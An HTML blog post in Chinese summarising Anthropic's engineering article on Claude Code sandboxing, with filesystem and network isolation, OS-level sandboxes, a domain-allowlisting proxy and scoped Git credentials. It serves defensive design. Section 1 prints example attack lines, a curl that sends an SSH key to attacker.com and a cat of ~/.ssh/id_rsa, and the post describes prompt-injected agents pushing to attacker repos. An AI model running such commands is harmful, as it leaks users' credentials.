@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="把 Anthropic Claude Code
+Sandboxing 工程文章拆成 5 个工程模式：filesystem + network
+双隔离缺一不可、OS 级 sandbox（bubblewrap /
+seatbelt）替代容器方案、proxy 化网络访问、scoped credential +
+内容校验、Claude Code on the web 的 cloud sandbox。配数据（permission
+prompt 降 84%）+ 落地配置 + 面试可讲的安全模型取舍。">
+    <meta name="author" content="Wanqing Chen">
+
+    <title>Claude Code 沙箱设计：文件系统 + 网络双重隔离的 5
+个工程模式 - Wanqing Chen</title>
+
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+
+    <link href="../navbar.css" rel="stylesheet">
+    <link href="../sticky-footer-navbar.css" rel="stylesheet">
+</head>
+
+<body id="page-top" data-bs-spy="scroll" data-bs-target="#navbar">
+
+    <nav class="navbar navbar-expand-lg navbar-light bg-light">
+        <div class="container">
+            <a class="navbar-brand" href="../index.html">@</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar"
+                aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div id="navbar" class="collapse navbar-collapse">
+                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
+                    <li class="nav-item"><a class="nav-link" href="../index.html">首页</a></li>
+                    <li class="nav-item"><a class="nav-link" href="../publication.html">作品</a></li>
+                    <li class="nav-item"><a class="nav-link active" aria-current="page" href="index.html">博客</a></li>
+                    <li class="nav-item"><a class="nav-link" href="../technology.html">技术</a></li>
+                    <li class="nav-item"><a class="nav-link" href="https://github.com/chenwanqing1024" target="_blank">项目</a></li>
+                    <li class="nav-item"><a class="nav-link" href="../about.html">关于</a></li>
+                </ul>
+                <form class="d-flex" role="search" action="https://www.google.com/search" method="GET" target="_blank">
+                    <input type="hidden" name="sitesearch" value="chenwanqing1024.github.io">
+                    <input class="form-control me-2" type="search" name="q" placeholder="关键词" aria-label="Search">
+                    <button class="btn btn-outline-success" type="submit">搜索</button>
+                </form>
+            </div>
+        </div>
+    </nav>
+
+    <div class="container">
+        <article class="py-3">
+            <h1>Claude Code 沙箱设计：文件系统 + 网络双重隔离的 5
+个工程模式</h1>
+            <p class="text-muted">
+                2026-09-15 · <span class="badge bg-secondary">Claude</span> <span class="badge bg-secondary">AI
+工程</span> <span class="badge bg-secondary">安全</span> <span class="badge bg-secondary">Sandbox</span> 
+            </p>
+
+            <div class="alert alert-light border" role="note">
+                <strong>读文笔记。</strong>本文是对他人文章的摘要与评述，非原文转载。
+                原文：<a href="https://www.anthropic.com/engineering/claude-code-sandboxing" target="_blank" rel="noopener">Sandboxing
+in Claude Code</a> · David Dworken, Oliver Weller-Davies (Anthropic)
+            </div>
+
+<h2 id="引子">引子</h2>
+<p>Claude Code 的默认权限模型是 read-only + 每次操作弹审批——结果和 Auto
+Mode
+文章里一样的真相：<strong>用户最终会点”是”不管内容</strong>。Anthropic
+的解法不是更好的 prompt，是<strong>OS 级沙箱</strong>——文件系统 +
+网络双重隔离，<strong>permission prompt 砍
+84%</strong>，<strong>没有容器开销</strong>。这是 2025 年 AI Agent
+安全的<strong>真正基建级</strong>进步——<strong>bubblewrap / seatbelt
+直接做</strong>，不是 Docker in Docker。</p>
+<p>下面拆 5 个工程模式，按”<strong>为什么单隔离不够 → OS 级 sandbox →
+网络 proxy → 凭证隔离 → 云端 sandbox</strong>”递进。</p>
+<hr />
+<h2 id="双隔离缺一不可filesystem-network-是-and-不是-or">1.
+双隔离缺一不可：filesystem + network 是 AND 不是 OR</h2>
+<p><strong>一行定位</strong>：<strong>单做 filesystem 隔离 =
+假安全</strong>——agent 能逃出 sandbox 拿网络；<strong>单做 network 隔离
+= 假安全</strong>——agent 能 exfil SSH keys。</p>
+<p><strong>Anthropic 的安全模型</strong>： - <strong>Filesystem
+isolation</strong>：Claude 只能读 / 写白名单目录（一般是当前 working dir
++ 配置里 allow 的 path）。<strong>任何写入 <code>/etc/passwd</code> /
+<code>~/.ssh/</code> / 外部 repo 的尝试被立刻拦截 + 通知</strong>。 -
+<strong>Network isolation</strong>：所有 outbound 流量走 unix domain
+socket → 外部 proxy。<strong>Proxy
+检查目标域名是否在白名单</strong>，不在就 block / 弹 confirm。 -
+<strong>两者都做才有意义</strong>：filesystem 拦 SSH key 被偷，network
+拦 key 被发出。</p>
+<p><strong>Anthropic 的原话</strong>： &gt; “Without network isolation,
+a compromised agent could exfiltrate sensitive files like SSH keys;
+without filesystem isolation, a compromised agent could easily escape
+the sandbox and gain network access.”</p>
+<p><strong>面试可讲的角度</strong>：这是 <em>defense in depth</em> 在
+agent 系统的落地。<strong>单一防御必然被绕过</strong>——filesystem 隔离有
+edge case（路径穿越、symlink trick），network 隔离有 edge case（DNS
+rebinding、proxy bypass）。<strong>两层独立 + 同时存在 =
+任一层单独不完美，乘起来仍然安全</strong>。</p>
+<p><strong>工程落地</strong>： - ☐ <strong>不要只做 filesystem
+隔离</strong>——agent
+<code>curl http://attacker.com/steal?key=$SSH</code> 你拦不住 - ☐
+<strong>不要只做 network 隔离</strong>——agent
+<code>cat ~/.ssh/id_rsa</code> 然后写到 working dir 你看不见 - ☐
+<strong>Filesystem 必须有 default deny</strong>——allowlist working
+dir，<strong>其它默认禁止</strong> - ☐ <strong>Network 必须 default
+deny</strong>——白名单已批准域名，新域名弹 confirm</p>
+<hr />
+<h2 id="os-级-sandboxbubblewrap-seatbelt-替代容器">2. OS 级
+Sandbox：bubblewrap / seatbelt 替代容器</h2>
+<p><strong>一行定位</strong>：<strong>不要用 Docker 做 agent
+sandbox</strong>——<strong>用 Linux bubblewrap / macOS
+seatbelt</strong>——零容器开销，原生 OS 隔离。</p>
+<p><strong>Anthropic 的设计</strong>： -
+<strong>Linux</strong>：<code>bubblewrap</code>（bwrap）——单二进制，按
+namespace 创建临时 root，挂载白名单目录。 -
+<strong>macOS</strong>：<code>seatbelt</code>（内核 sandbox
+扩展）——Apple 原生的 process-level sandbox。 - <strong>不用 Docker /
+Podman</strong>——这些是 VM-level，启动慢，资源重，<strong>对一个交互式
+CLI agent 过度</strong>。 - <strong>覆盖 subprocess</strong>——任何
+Claude 启动的脚本、子进程、MCP server 都受 sandbox
+约束（<strong>不是只拦 Claude 自己</strong>）。</p>
+<p><strong>面试可讲的角度</strong>：这是 <em>least privilege applied to
+OS primitives</em>。<strong>每个 Linux 进程本来就有 namespace
+能力</strong>（mount / network / PID / IPC），bubblewrap
+直接用——<strong>不需要 container
+引擎做这件事</strong>。<strong>容器是给”装一整个 Linux 服务”用的，agent
+sandbox 是给”限制一个进程”用的</strong>。</p>
+<p><strong>工程落地</strong>： - ☐ <strong>优先用 OS-level
+sandbox</strong>——bwrap / seatbelt 启动 &lt; 100ms，无 image pull - ☐
+<strong>只在你必须隔离 multi-tenant 时用 Docker / gVisor /
+Firecracker</strong>——开销大但隔离强 - ☐ <strong>Sandbox
+必须递归</strong>——subprocess 也受约束，<strong>不要相信”agent 自己是
+safe 的”</strong> - ☐ <strong>Anthropic 开源了 sandbox
+runtime</strong>——https://github.com/anthropics/claude-code-sandbox
+可以参考</p>
+<hr />
+<h2 id="网络-proxyunix-socket-域名白名单">3. 网络 Proxy：unix socket +
+域名白名单</h2>
+<p><strong>一行定位</strong>：<strong>让所有 outbound 流量走外部
+proxy</strong>——<strong>sandbox 内不可信，proxy
+外可信</strong>，<strong>白名单 + 内容校验都在 proxy</strong>。</p>
+<p><strong>Anthropic 的实现</strong>： - Sandbox 内进程只能通过
+<strong>unix domain socket</strong> 连
+proxy，<strong>不能直接用网络栈</strong>。 - Proxy 跑在 sandbox
+外，<strong>验证</strong>： - 目标域名是否在白名单（GitHub / npm / PyPI
+/ internal registry / etc.） - 协议是否允许（HTTP / HTTPS / gRPC） -
+流量大小限制 - <strong>新域名弹 confirm</strong>——用户可以临时允许。</p>
+<p><strong>好处</strong>： - <strong>Proxy 是 single
+chokepoint</strong>——所有流量一处的审计 + 限制 - <strong>Network
+namespace 隔离 + proxy 业务逻辑</strong>双层防御 - <strong>Custom proxy
+支持任意规则</strong>——例如 “禁止任何 POST 到 *.example.com”</p>
+<p><strong>面试可讲的角度</strong>：这是 <em>service mesh sidecar
+pattern</em>——<strong>Istio / Linkerd 把网络流量劫持到 sidecar 做 policy
+enforcement，agent sandbox 把网络流量劫持到外部 proxy
+做同样事</strong>。<strong>不是 agent
+自己管网络，是外部进程代管</strong>。</p>
+<p><strong>工程落地 checklist</strong>： - ☐ <strong>Sandbox 内进程用
+unix socket，不是 TCP</strong>——<strong>sandbox 里 TCP
+应该是禁止的</strong> - ☐ <strong>Proxy 在 sandbox
+外</strong>，进程不可信是 sandbox 内的，proxy 是可信的 - ☐
+<strong>域名白名单 = allowlist + 新域名 confirm</strong>——而不是 deny
+list（容易被绕过） - ☐ <strong>TLS 终止在 proxy</strong>——sandbox
+内进程不直接做 TLS，<strong>避免证书伪造</strong> - ☐ <strong>记 audit
+log</strong>——所有 outbound 流量、目标、大小、结果<strong>进
+SIEM</strong></p>
+<hr />
+<h2 id="scoped-credentialgit-凭证不出-sandbox">4. Scoped Credential：Git
+凭证不出 sandbox</h2>
+<p><strong>一行定位</strong>：<strong>Token 永远不进
+sandbox</strong>——<strong>sandbox 用 scoped credential 调外部
+proxy，proxy 验内容后挂真 token</strong>。</p>
+<p><strong>Anthropic 的设计</strong>（Git 为例）： - Sandbox 内 git
+client → <strong>scoped credential</strong>（只能推送到配置好的 branch）
+- 外部 proxy <strong>验证 credential + git 命令内容</strong>（如
+<code>git push origin main</code> 是否只 push 到 main） - 验证通过 →
+proxy <strong>挂上真 GitHub token</strong> → 转发到 GitHub</p>
+<p><strong>关键约束</strong>： - 真 GitHub token <strong>从不在 sandbox
+里</strong>——<strong>任何路径都拿不到</strong>。 - 凭证粒度很细：scoped
+credential 不能推 main / 不能 force push / 不能 push 到非配置 repo。 -
+即使 agent 被 prompt injection hijack 想 push 到 attacker
+repo，<strong>proxy 看到目标不对就拒</strong>。</p>
+<p><strong>面试可讲的角度</strong>：这是 <em>credential isolation by
+design</em>——传统 dev workflow 把 GitHub token 放在
+<code>~/.netrc</code> / <code>~/.gitconfig</code>，被 prompt injection
+直接读。<strong>Scoped credential 是”零信任”的 git
+版</strong>——<strong>token
+不能从它应该用的地方被搬到别的地方</strong>。</p>
+<p><strong>工程落地</strong>： - ☐ <strong>任何 secret 都走
+proxy</strong>——API keys / DB passwords / signing keys，<strong>never in
+sandbox env vars</strong> - ☐ <strong>Scoped credential per
+task</strong>——一次性、限范围、可吊销 - ☐ <strong>Proxy
+验证命令内容</strong>——不只是看 credential，<strong>还看
+action</strong>（防止 credential 本身合法但 action 危险） - ☐
+<strong>Force push / pull secret / push to non-allowed repo</strong>
+都该 block</p>
+<hr />
+<h2 id="claude-code-on-the-webcloud-sandbox">5. Claude Code on the
+Web：Cloud Sandbox</h2>
+<p><strong>一行定位</strong>：<strong>当用户的本地环境太敏感时</strong>——<strong>跑在
+cloud sandbox 里，credentials 由 proxy 持有</strong>。</p>
+<p><strong>Anthropic 的设计</strong>： - 每个 web session = 一个独立
+cloud sandbox。 - 凭证（git credentials / signing keys）<strong>永远不在
+sandbox 里</strong>。 - Git proxy 透明转发所有 git 操作（push / pull /
+clone）——<strong>用户不用感知</strong>。 - 即使 cloud sandbox
+整个被攻破，<strong>user 的真凭证没泄露</strong>。</p>
+<p><strong>使用场景</strong>： - <strong>敏感 repo 在 corporate
+内网</strong>——本地 dev 太麻烦，cloud sandbox + proxy 配 corporate VPN
+即可。 - <strong>PR review / quick fix</strong>——5 分钟的任务不想 clone
+整个 repo。 - <strong>教新人 codebase</strong>——cloud sandbox
+临时环境，干完即扔。</p>
+<p><strong>面试可讲的角度</strong>：这是 <em>ephemeral environment</em>
+的应用——<strong>临时 + 隔离 + 凭证安全</strong>是 cloud sandbox
+的三大优势。<strong>本地 dev environment 是”长寿 + 易污染”，cloud
+sandbox 是”短寿 + 干净”</strong>。</p>
+<p><strong>工程落地</strong>： - ☐ <strong>Cloud sandbox 必须
+ephemeral</strong>——session 结束销毁，<strong>不留任何 state</strong> -
+☐ <strong>Network egress 走 corporate proxy</strong>——和本地 sandbox
+同样约束 - ☐ <strong>Code 从 git clone，每次新 session 重新
+clone</strong>——不缓存任何 user content - ☐ <strong>Resource
+quota</strong>——CPU / memory / network 都有上限，<strong>防止 runaway
+agent</strong></p>
+<hr />
+<h2 id="数据收益">数据收益</h2>
+<table>
+<colgroup>
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+<col style="width: 25%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>指标</th>
+<th>Before（手动审批）</th>
+<th>After（sandbox）</th>
+<th>改进</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>Permission prompts / session</td>
+<td>100%</td>
+<td>16%</td>
+<td><strong>降 84%</strong></td>
+</tr>
+<tr class="even">
+<td>安全（prompt injection 成功率）</td>
+<td>中</td>
+<td>高</td>
+<td>filesystem + network 双拦截</td>
+</tr>
+<tr class="odd">
+<td>用户体验</td>
+<td>“approve 疲劳”</td>
+<td>流畅</td>
+<td>减少中断</td>
+</tr>
+<tr class="even">
+<td>启动开销</td>
+<td>0</td>
+<td>&lt; 100ms</td>
+<td>bubblewrap 启动</td>
+</tr>
+<tr class="odd">
+<td>凭证安全</td>
+<td>在 sandbox 内</td>
+<td>proxy 外</td>
+<td>永不出 sandbox</td>
+</tr>
+</tbody>
+</table>
+<p><strong>面试可讲的角度</strong>：<strong>安全设计的目标是”既更安全又更方便”——不是
+trade-off</strong>。<strong>Anthropic 的 sandbox 同时降 84% prompt +
+提升安全</strong>——证明好的安全设计 =
+减摩擦，<strong>不是加摩擦</strong>。</p>
+<hr />
+<h2 id="一句话总结">一句话总结</h2>
+<p>Claude Code 沙箱的核心论点是<strong>双隔离是必须的，OS 级 sandbox
+比容器轻，凭证永远出不了 sandbox 边界</strong>。<strong>filesystem +
+network 双拦截、bubblewrap/seatbelt 替代 Docker、scoped credential +
+内容校验 proxy</strong>——这三层组合让 84% 的审批弹窗消失 + 真凭证永不进
+sandbox。<strong>好的安全设计是减摩擦，不是加摩擦</strong>。</p>
+<h2 id="配套阅读">配套阅读</h2>
+<ul>
+<li><strong>同主题</strong>：auto-mode-defense-architecture —
+reasoning-blind classifier 是 sandbox 之外的第二层</li>
+<li><strong>架构视角</strong>：managed-agents-arch-patterns — session /
+harness / sandbox 三层解耦</li>
+<li><strong>执行机制</strong>：code-execution-with-mcp — code execution
+的 sandbox 设计参考</li>
+</ul>
+<p>参考资料：</p>
+<ul>
+<li><a
+href="https://www.anthropic.com/engineering/claude-code-sandboxing">Sandboxing
+in Claude Code</a> — David Dworken, Oliver Weller-Davies, Anthropic</li>
+<li><a
+href="https://github.com/anthropics/claude-code-sandbox">Anthropic
+sandbox runtime (open source)</a> — bubblewrap / seatbelt 实现参考</li>
+<li><a
+href="https://www.anthropic.com/engineering/claude-code-auto-mode">Auto
+mode</a> — sandbox 之外的 AI 层防御</li>
+</ul>
+        </article>
+
+        <p><a href="index.html">&larr; 返回博客列表</a></p>
+
+        <footer class="footer mt-auto py-3 bg-light">
+            <div class="container">
+                <p class="text-muted">最后更新：2026-09-15</p>
+            </div>
+        </footer>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
+        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV2MPK8M2HN" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
